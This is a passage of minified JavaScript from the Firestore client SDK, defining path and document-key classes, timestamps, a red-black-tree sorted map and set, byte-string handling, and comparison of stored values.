0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,o=this.limit();t<o;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){const o=Math.min(e.length,t.length);for(let r=0;r<o;r++){const l=ho.compareSegments(e.get(r),t.get(r));if(l!==0)return l}return Ye(e.length,t.length)}static compareSegments(e,t){const o=ho.isNumericId(e),r=ho.isNumericId(t);return o&&!r?-1:!o&&r?1:o&&r?ho.extractNumericId(e).compare(ho.extractNumericId(t)):bg(e,t)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return Ji.fromString(e.substring(4,e.length-2))}}class Da extends ho{construct(e,t,o){return new Da(e,t,o)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const t=[];for(const o of e){if(o.indexOf("//")>=0)throw new xe(de.INVALID_ARGUMENT,`Invalid segment (${o}). Paths must not contain // in them.`);t.push(...o.split("/").filter((r=>r.length>0)))}return new Da(t)}static emptyPath(){return new Da([])}}const JL=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class pt extends ho{construct(e,t,o){return new pt(e,t,o)}static isValidIdentifier(e){return JL.test(e)}canonicalString(){return this.toArray().map((e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),pt.isValidIdentifier(e)||(e="`"+e+"`"),e))).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===xC}static keyField(){return new pt([xC])}static fromServerFormat(e){const t=[];let o="",r=0;const l=()=>{if(o.length===0)throw new xe(de.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(o),o=""};let c=!1;for(;r<e.length;){const d=e[r];if(d==="\\"){if(r+1===e.length)throw new xe(de.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const f=e[r+1];if(f!=="\\"&&f!=="."&&f!=="`")throw new xe(de.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);o+=f,r+=2}else d==="`"?(c=!c,r++):d!=="."||c?(o+=d,r++):(l(),r++)}if(l(),c)throw new xe(de.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new pt(t)}static emptyPath(){return new pt([])}}class Le{constructor(e){this.path=e}static fromPath(e){return new Le(Da.fromString(e))}static fromName(e){return new Le(Da.fromString(e).popFirst(5))}static empty(){return new Le(Da.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&Da.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,t){return Da.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Le(new Da(e.slice()))}}function QL(a,e,t){if(!t)throw new xe(de.INVALID_ARGUMENT,`Function ${a}() cannot be called with an empty ${e}.`)}function WL(a,e,t,o){if(e===!0&&o===!0)throw new xe(de.INVALID_ARGUMENT,`${a} and ${t} cannot be used together.`)}function jC(a){if(!Le.isDocumentKey(a))throw new xe(de.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${a} has ${a.length}.`)}function pT(a){return typeof a=="object"&&a!==null&&(Object.getPrototypeOf(a)===Object.prototype||Object.getPrototypeOf(a)===null)}function rb(a){if(a===void 0)return"undefined";if(a===null)return"null";if(typeof a=="string")return a.length>20&&(a=`${a.substring(0,20)}...`),JSON.stringify(a);if(typeof a=="number"||typeof a=="boolean")return""+a;if(typeof a=="object"){if(a instanceof Array)return"an array";{const e=(function(o){return o.constructor?o.constructor.name:null})(a);return e?`a custom ${e} object`:"an object"}}return typeof a=="function"?"a function":we(12329,{type:typeof a})}function Wi(a,e){if("_delegate"in a&&(a=a._delegate),!(a instanceof e)){if(e.name===a.constructor.name)throw new xe(de.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const t=rb(a);throw new xe(de.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${t}`)}}return a}function Ya(a,e){const t={typeString:a};return e&&(t.value=e),t}function du(a,e){if(!pT(a))throw new xe(de.INVALID_ARGUMENT,"JSON must be an object");let t;for(const o in e)if(e[o]){const r=e[o].typeString,l="value"in e[o]?{value:e[o].value}:void 0;if(!(o in a)){t=`JSON missing required field: '${o}'`;break}const c=a[o];if(r&&typeof c!==r){t=`JSON field '${o}' must be a ${r}.`;break}if(l!==void 0&&c!==l.value){t=`Expected '${o}' field to equal '${l.value}'`;break}}if(t)throw new xe(de.INVALID_ARGUMENT,t);return!0}const PC=-62135596800,qC=1e6;class Pa{static now(){return Pa.fromMillis(Date.now())}static fromDate(e){return Pa.fromMillis(e.getTime())}static fromMillis(e){const t=Math.floor(e/1e3),o=Math.floor((e-1e3*t)*qC);return new Pa(t,o)}constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new xe(de.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new xe(de.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<PC)throw new xe(de.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new xe(de.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/qC}_compareTo(e){return this.seconds===e.seconds?Ye(this.nanoseconds,e.nanoseconds):Ye(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{type:Pa._jsonSchemaVersion,seconds:this.seconds,nanoseconds:this.nanoseconds}}static fromJSON(e){if(du(e,Pa._jsonSchema))return new Pa(e.seconds,e.nanoseconds)}valueOf(){const e=this.seconds-PC;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}Pa._jsonSchemaVersion="firestore/timestamp/1.0",Pa._jsonSchema={type:Ya("string",Pa._jsonSchemaVersion),seconds:Ya("number"),nanoseconds:Ya("number")};class _e{static fromTimestamp(e){return new _e(e)}static min(){return new _e(new Pa(0,0))}static max(){return new _e(new Pa(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}const $c=-1;function KL(a,e){const t=a.toTimestamp().seconds,o=a.toTimestamp().nanoseconds+1,r=_e.fromTimestamp(o===1e9?new Pa(t+1,0):new Pa(t,o));return new Ki(r,Le.empty(),e)}function $L(a){return new Ki(a.readTime,a.key,$c)}class Ki{constructor(e,t,o){this.readTime=e,this.documentKey=t,this.largestBatchId=o}static min(){return new Ki(_e.min(),Le.empty(),$c)}static max(){return new Ki(_e.max(),Le.empty(),$c)}}function YL(a,e){let t=a.readTime.compareTo(e.readTime);return t!==0?t:(t=Le.comparator(a.documentKey,e.documentKey),t!==0?t:Ye(a.largestBatchId,e.largestBatchId))}const XL="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class ZL{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach((e=>e()))}}async function pl(a){if(a.code!==de.FAILED_PRECONDITION||a.message!==XL)throw a;Ee("LocalStore","Unexpectedly lost primary lease")}class ce{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e((t=>{this.isDone=!0,this.result=t,this.nextCallback&&this.nextCallback(t)}),(t=>{this.isDone=!0,this.error=t,this.catchCallback&&this.catchCallback(t)}))}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&we(59440),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new ce(((o,r)=>{this.nextCallback=l=>{this.wrapSuccess(e,l).next(o,r)},this.catchCallback=l=>{this.wrapFailure(t,l).next(o,r)}}))}toPromise(){return new Promise(((e,t)=>{this.next(e,t)}))}wrapUserFunction(e){try{const t=e();return t instanceof ce?t:ce.resolve(t)}catch(t){return ce.reject(t)}}wrapSuccess(e,t){return e?this.wrapUserFunction((()=>e(t))):ce.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction((()=>e(t))):ce.reject(t)}static resolve(e){return new ce(((t,o)=>{t(e)}))}static reject(e){return new ce(((t,o)=>{o(e)}))}static waitFor(e){return new ce(((t,o)=>{let r=0,l=0,c=!1;e.forEach((d=>{++r,d.next((()=>{++l,c&&l===r&&t()}),(f=>o(f)))})),c=!0,l===r&&t()}))}static or(e){let t=ce.resolve(!1);for(const o of e)t=t.next((r=>r?ce.resolve(r):o()));return t}static forEach(e,t){const o=[];return e.forEach(((r,l)=>{o.push(t.call(this,r,l))})),this.waitFor(o)}static mapArray(e,t){return new ce(((o,r)=>{const l=e.length,c=new Array(l);let d=0;for(let f=0;f<l;f++){const p=f;t(e[p]).next((v=>{c[p]=v,++d,d===l&&o(c)}),(v=>r(v)))}}))}static doWhile(e,t){return new ce(((o,r)=>{const l=()=>{e()===!0?t().next((()=>{l()}),r):o()};l()}))}}function e2(a){const e=a.match(/Android ([\d.]+)/i),t=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(t)}function ml(a){return a.name==="IndexedDbTransactionError"}class em{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=o=>this.ae(o),this.ue=o=>t.writeSequenceNumber(o))}ae(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.ue&&this.ue(e),e}}em.ce=-1;const sb=-1;function am(a){return a==null}function jp(a){return a===0&&1/a==-1/0}function a2(a){return typeof a=="number"&&Number.isInteger(a)&&!jp(a)&&a<=Number.MAX_SAFE_INTEGER&&a>=Number.MIN_SAFE_INTEGER}const mT="";function t2(a){let e="";for(let t=0;t<a.length;t++)e.length>0&&(e=RC(e)),e=n2(a.get(t),e);return RC(e)}function n2(a,e){let t=e;const o=a.length;for(let r=0;r<o;r++){const l=a.charAt(r);switch(l){case"\0":t+="";break;case mT:t+="";break;default:t+=l}}return t}function RC(a){return a+mT+""}function LC(a){let e=0;for(const t in a)Object.prototype.hasOwnProperty.call(a,t)&&e++;return e}function Yr(a,e){for(const t in a)Object.prototype.hasOwnProperty.call(a,t)&&e(t,a[t])}function fT(a){for(const e in a)if(Object.prototype.hasOwnProperty.call(a,e))return!1;return!0}class wa{constructor(e,t){this.comparator=e,this.root=t||dt.EMPTY}insert(e,t){return new wa(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,dt.BLACK,null,null))}remove(e){return new wa(this.comparator,this.root.remove(e,this.comparator).copy(null,null,dt.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){const o=this.comparator(e,t.key);if(o===0)return t.value;o<0?t=t.left:o>0&&(t=t.right)}return null}indexOf(e){let t=0,o=this.root;for(;!o.isEmpty();){const r=this.comparator(e,o.key);if(r===0)return t+o.left.size;r<0?o=o.left:(t+=o.left.size+1,o=o.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal(((t,o)=>(e(t,o),!1)))}toString(){const e=[];return this.inorderTraversal(((t,o)=>(e.push(`${t}:${o}`),!1))),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new $d(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new $d(this.root,e,this.comparator,!1)}getReverseIterator(){return new $d(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new $d(this.root,e,this.comparator,!0)}}class $d{constructor(e,t,o,r){this.isReverse=r,this.nodeStack=[];let l=1;for(;!e.isEmpty();)if(l=t?o(e.key,t):1,t&&r&&(l*=-1),l<0)e=this.isReverse?e.left:e.right;else{if(l===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class dt{constructor(e,t,o,r,l){this.key=e,this.value=t,this.color=o??dt.RED,this.left=r??dt.EMPTY,this.right=l??dt.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,o,r,l){return new dt(e??this.key,t??this.value,o??this.color,r??this.left,l??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,o){let r=this;const l=o(e,r.key);return r=l<0?r.copy(null,null,null,r.left.insert(e,t,o),null):l===0?r.copy(null,t,null,null,null):r.copy(null,null,null,null,r.right.insert(e,t,o)),r.fixUp()}removeMin(){if(this.left.isEmpty())return dt.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let o,r=this;if(t(e,r.key)<0)r.left.isEmpty()||r.left.isRed()||r.left.left.isRed()||(r=r.moveRedLeft()),r=r.copy(null,null,null,r.left.remove(e,t),null);else{if(r.left.isRed()&&(r=r.rotateRight()),r.right.isEmpty()||r.right.isRed()||r.right.left.isRed()||(r=r.moveRedRight()),t(e,r.key)===0){if(r.right.isEmpty())return dt.EMPTY;o=r.right.min(),r=r.copy(o.key,o.value,null,null,r.right.removeMin())}r=r.copy(null,null,null,null,r.right.remove(e,t))}return r.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,dt.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,dt.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed())throw we(43730,{key:this.key,value:this.value});if(this.right.isRed())throw we(14113,{key:this.key,value:this.value});const e=this.left.check();if(e!==this.right.check())throw we(27949);return e+(this.isRed()?0:1)}}dt.EMPTY=null,dt.RED=!0,dt.BLACK=!1;dt.EMPTY=new class{constructor(){this.size=0}get key(){throw we(57766)}get value(){throw we(16141)}get color(){throw we(16727)}get left(){throw we(29726)}get right(){throw we(36894)}copy(e,t,o,r,l){return this}insert(e,t,o){return new dt(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};class at{constructor(e){this.comparator=e,this.data=new wa(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal(((t,o)=>(e(t),!1)))}forEachInRange(e,t){const o=this.data.getIteratorFrom(e[0]);for(;o.hasNext();){const r=o.getNext();if(this.comparator(r.key,e[1])>=0)return;t(r.key)}}forEachWhile(e,t){let o;for(o=t!==void 0?this.data.getIteratorFrom(t):this.data.getIterator();o.hasNext();)if(!e(o.getNext().key))return}firstAfterOrEqual(e){const t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new IC(this.data.getIterator())}getIteratorFrom(e){return new IC(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach((o=>{t=t.add(o)})),t}isEqual(e){if(!(e instanceof at)||this.size!==e.size)return!1;const t=this.data.getIterator(),o=e.data.getIterator();for(;t.hasNext();){const r=t.getNext().key,l=o.getNext().key;if(this.comparator(r,l)!==0)return!1}return!0}toArray(){const e=[];return this.forEach((t=>{e.push(t)})),e}toString(){const e=[];return this.forEach((t=>e.push(t))),"SortedSet("+e.toString()+")"}copy(e){const t=new at(this.comparator);return t.data=e,t}}class IC{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}class Mn{constructor(e){this.fields=e,e.sort(pt.comparator)}static empty(){return new Mn([])}unionWith(e){let t=new at(pt.comparator);for(const o of this.fields)t=t.add(o);for(const o of e)t=t.add(o);return new Mn(t.toArray())}covers(e){for(const t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return nl(this.fields,e.fields,((t,o)=>t.isEqual(o)))}}class hT extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}class ft{constructor(e){this.binaryString=e}static fromBase64String(e){const t=(function(r){try{return atob(r)}catch(l){throw typeof DOMException<"u"&&l instanceof DOMException?new hT("Invalid base64 string: "+l):l}})(e);return new ft(t)}static fromUint8Array(e){const t=(function(r){let l="";for(let c=0;c<r.length;++c)l+=String.fromCharCode(r[c]);return l})(e);return new ft(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return(function(t){return btoa(t)})(this.binaryString)}toUint8Array(){return(function(t){const o=new Uint8Array(t.length);for(let r=0;r<t.length;r++)o[r]=t.charCodeAt(r);return o})(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return Ye(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}ft.EMPTY_BYTE_STRING=new ft("");const o2=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function $i(a){if(ma(!!a,39018),typeof a=="string"){let e=0;const t=o2.exec(a);if(ma(!!t,46558,{timestamp:a}),t[1]){let r=t[1];r=(r+"000000000").substr(0,9),e=Number(r)}const o=new Date(a);return{seconds:Math.floor(o.getTime()/1e3),nanos:e}}return{seconds:za(a.seconds),nanos:za(a.nanos)}}function za(a){return typeof a=="number"?a:typeof a=="string"?Number(a):0}function Yi(a){return typeof a=="string"?ft.fromBase64String(a):ft.fromUint8Array(a)}const gT="server_timestamp",bT="__type__",vT="__previous_value__",yT="__local_write_time__";function lb(a){return(a?.mapValue?.fields||{})[bT]?.stringValue===gT}function tm(a){const e=a.mapValue.fields[vT];return lb(e)?tm(e):e}function Yc(a){const e=$i(a.mapValue.fields[yT].timestampValue);return new Pa(e.seconds,e.nanos)}class i2{constructor(e,t,o,r,l,c,d,f,p,v,y){this.databaseId=e,this.appId=t,this.persistenceKey=o,this.host=r,this.ssl=l,this.forceLongPolling=c,this.autoDetectLongPolling=d,this.longPollingOptions=f,this.useFetchStreams=p,this.isUsingEmulator=v,this.apiKey=y}}const Pp="(default)";class Xc{constructor(e,t){this.projectId=e,this.database=t||Pp}static empty(){return new Xc("","")}get isDefaultDatabase(){return this.database===Pp}isEqual(e){return e instanceof Xc&&e.projectId===this.projectId&&e.database===this.database}}function r2(a,e){if(!Object.prototype.hasOwnProperty.apply(a.options,["projectId"]))throw new xe(de.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Xc(a.options.projectId,e)}const ET="__type__",s2="__max__",Yd={mapValue:{}},ST="__vector__",qp="value";function Xi(a){return"nullValue"in a?0:"booleanValue"in a?1:"integerValue"in a||"doubleValue"in a?2:"timestampValue"in a?3:"stringValue"in a?5:"bytesValue"in a?6:"referenceValue"in a?7:"geoPointValue"in a?8:"arrayValue"in a?9:"mapValue"in a?lb(a)?4:c2(a)?9007199254740991:l2(a)?10:11:we(28295,{value:a})}function Eo(a,e){if(a===e)return!0;const t=Xi(a);if(t!==Xi(e))return!1;switch(t){case 0:case 9007199254740991:return!0;case 1:return a.booleanValue===e.booleanValue;case 4:return Yc(a).isEqual(Yc(e));case 3:return(function(r,l){if(typeof r.timestampValue=="string"&&typeof l.timestampValue=="string"&&r.timestampValue.length===l.timestampValue.length)return r.timestampValue===l.timestampValue;const c=$i(r.timestampValue),d=$i(l.timestampValue);return c.seconds===d.seconds&&c.nanos===d.nanos})(a,e);case 5:return a.stringValue===e.stringValue;case 6:return(function(r,l){return Yi(r.bytesValue).isEqual(Yi(l.bytesValue))})(a,e);case 7:return a.referenceValue===e.referenceValue;case 8:return(function(r,l){return za(r.geoPointValue.latitude)===za(l.geoPointValue.latitude)&&za(r.geoPointValue.longitude)===za(l.geoPointValue.longitude)})(a,e);case 2:return(function(r,l){if("integerValue"in r&&"integerValue"in l)return za(r.integerValue)===za(l.integerValue);if("doubleValue"in r&&"doubleValue"in l){const c=za(r.doubleValue),d=za(l.doubleValue);return c===d?jp(c)===jp(d):isNaN(c)&&isNaN(d)}return!1})(a,e);case 9:return nl(a.arrayValue.values||[],e.arrayValue.values||[],Eo);case 10:case 11:return(function(r,l){const c=r.mapValue.fields||{},d=l.mapValue.fields||{};if(LC(c)!==LC(d))return!1;for(const f in c)if(c.hasOwnProperty(f)&&(d[f]===void 0||!Eo(c[f],d[f])))return!1;return!0})(a,e);default:return we(52216,{left:a})}}function Zc(a,e){return(a.values||[]).find((t=>Eo(t,e)))!==void 0}function ol(a,e){if(a===e)return 0;const t=Xi(a),o=Xi(e);if(t!==o)return Ye(t,o);switch(t){case 0:case 9007199254740991:return 0;case 1:return Ye(a.booleanValue,e.booleanValue);case 2:return(function(l,c){const d=za(l.integerValue||l.doubleValue),f=za(c.integerValue||c.doubleValue);return d<f?-1:d>f?1:d===f?0:isNaN(d)?isNaN(f)?0:-1:1})(a,e);case 3:return DC(a.timestampValue,e.timestampValue);case 4:return DC(Yc(a),Yc(e));case 5:return bg(a.stringValue,e.stringValue);case 6:return(function(l,c){const d=Yi(l),f=Yi(c);return d.compareTo(f)})(a.bytesValue,e.bytesValue);case 7:return(function(l,c){const d=l.split("/"),f=c.split("/");for(let p=0;p<d.length&&p<f.length;p++){const v=Ye(d[p],f[p]);if(v!==0)return v}return Ye(d.length,f.length)})(a.referenceValue,e.referenceValue);case 8:return(function(l,c){const d=Ye(za(l.latitude),za(c.latitude));return d!==0?d:Ye(za(l.longitude),za(c.longitude))})(a.geoPointValue,e.geoPointValue);case 9:return wC(a.arrayValue,e.arrayValue);case 10:return(function(l,c){const d=l.fields||{},f=c.fields||{},p=d[qp]?.arrayValue,v=f[qp]?.arrayValue,y=Ye(p?.values?.length||0,v?.values?.length||0);return y!==0?y:wC(p,v)})(a.mapValue,e.mapValue);case 11:return(function(l,c){if(l===Yd.mapValue&&c===Yd.mapValue)return 0;if(l===Yd.mapValue)return 1;if(c===Yd.mapValue)return-1;const d=l.fields||{},f=Object.keys(d),p=c.fields||{},v=Object.keys(p);f.sort(),v.sort();for(let y=0;y<f.length&&y<v.length;++y){const S=bg(f[y],v[y]);if(S!==0)return S;const A=ol(d[f[y]],p[v[y]]);if(A!==0)return A}return Ye(f.length,v.length)})(a.mapValue,e.mapValue);default:throw we(23264,{he:t})}}function DC(a,e){if(typeof a=="string"&&typeof e=="string"&&a.length===e.length)return Ye(a,e);const t=$i(a),o=$i(e),r=Ye(t.seconds,o.seconds);return r!==0?r:Ye(t.nanos,o.nanos)}function wC(a,e){const t=a.values||[],o=e.values||[];for(let r=0;r<t.length&&r<o.length;++r){const l=ol(t[r],o[r]);if(l)return l}return Ye(t.length,o.length)}function il(a){return vg(a)}function vg(a){return"nullValue"in a?"null":"booleanValue"in a?""+a.booleanValue:"integerValue"in a?""+a.integerValue:"doubleValue"in a?""+a.doubleValue:"timestampValue"in a?(function(t){const o=$i(t);return`time(${o.seconds},${o.nanos})`})(a.timestampValue):"stringValue"in a?a.stringValue:"bytesValue"in a?(function(t){return Yi(t).toBase64()})(a.bytesValue):"referenceValue"in a?(function(t){return Le.fromName(t).toString()})(a.referenceValue):"geoPointValue"in a?(function(t){return`geo(${t.latitude},${t.longitude})`})(a.geoPointValue):"arrayValue"in a?(function(t){let o="[",r=!0;for(const l of t.values||[])r?r=!1:o+=",",o+=vg(l);return o+"]"})(a.arrayValue):"mapValue"in a?(function(t){const o=Object.keys(t.fields||{}).sort();let r="{",l=!0;for(const c of o)l?l=!1:r+=",",r+=`${c}:${vg(t.fields[c])}`;return r+"}"})(a.mapValue):we(61005,{value:a})}function dp(a){switch(Xi(a)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=tm(a);return e?16+dp(e):16;case 5:return 2*a.stringValue.length;case 6:return Yi(a.bytesValue).approximateByteSize();case 7:return a.referenceValue.length;case 9:return(function(o){return(o.values||[]).reduce(((r,l)=>r+dp(l)),0)})(a.arrayValue);case 10:case 11:return(function(o){let r=0;return Yr(o.fields,((l,c)=>{r+=l.length+dp(c)})),r})(a.mapValue);default:throw we(13486,{value:a})}}function yg(a){return!!a&&"integerValue"in a}function cb(a){return!!a&&"arrayValue"in a}function MC(a){return!!a&&"nullValue"in a}function _C(a){return!!a&&"doubleValue"in a&&isNaN(Number(a.doubleValue))}function pp(a){return!!a&&"mapValue"in a}function l2(a){return(a?.mapValue?.fields||{})[ET]?.stringValue===ST}function Uc(a){if(a.geoPointValue)return{geoPointValue:{...a.geoPointValue}};if(a.timestampValue&&typeof a.timestampValue=="object")return{timestampValue:{...a.timestampValue}};if(a.mapValue){const e={mapValue:{fields:{}}};return Yr(a.mapValue.fields,((t,o)=>e.mapValue.fields[t]=Uc(o))),e}if(a.arrayValue){const e={arrayValue:{values:[]}};for(let t=0;t<(a.arrayValue.values||[]).length;++t)e.arrayValue.values[t]=Uc(a.arrayValue.values[t]);return e}return{...a}}function c2(a){return(((a.mapValue||{}).fields||{}).__type__||{}).stringValue===s2}class vn{constructor(e){this.value=e}static empty(){return new vn({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let o=0;o<e.length-1;++o)if(t=(t.mapValue.fields||{})[e.get(o)],!pp(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=Uc(t)}setAll(e){let t=pt.emptyPath(),o={},r=[];e.forEach(((c,d)=>{if(!t.isImmediateParentOf(d)){const f=this.getFieldsMap(t);this.applyChanges(f,o,r),o={},r=[],t=d.popLast()}c?o[d.lastSegment()]=Uc(c):r.push(d.lastSegment())}));const l=this.getFieldsMap(t);this.applyChanges(l,o,r)}delete(e){const t=this.field(e.popLast());pp(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return Eo(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let o=0;o<e.length;++o){let r=t.mapValue.fields[e.get(o)];pp(r)&&r.mapValue.fields||(r={mapValue:{fields:{}}},t.mapValue.fields[e.get(o)]=r),t=r}return t.mapValue.fields}applyChanges(e,t,o){Yr(t,((r,l)=>e[r]=l));for(const r of o)delete e[r]}clone(){return new vn(Uc(this.value))}}function CT(a){const e=[];return Yr(a.fields,((t,o)=>{const r=new pt([t]);if(pp(o)){const l=CT(o.mapValue).fields;if(l.length===0)e.push(r);else for(const c of l)e.push(r.child(c))}else e.push(r)})),new Mn(e)}class Et{constructor(e,t,o,r,l,c,d){this.key=e,this.documentType=t,this.version=o,this.readTime=r,this.createTime=l,this.data=c,this.documentState=d}static newInvalidDocument(e){return new Et(e,0,_e.min(),_e.min(),_e.min(),vn.empty(),0)}static newFoundDocument(e,t,o,r){return new Et(e,1,t,_e.min(),o,r,0)}static newNoDocument(e,t){return new Et(e,2,t,_e.min(),_e.min(),vn.empty(),0)}static newUnknownDocument(e,t){return new 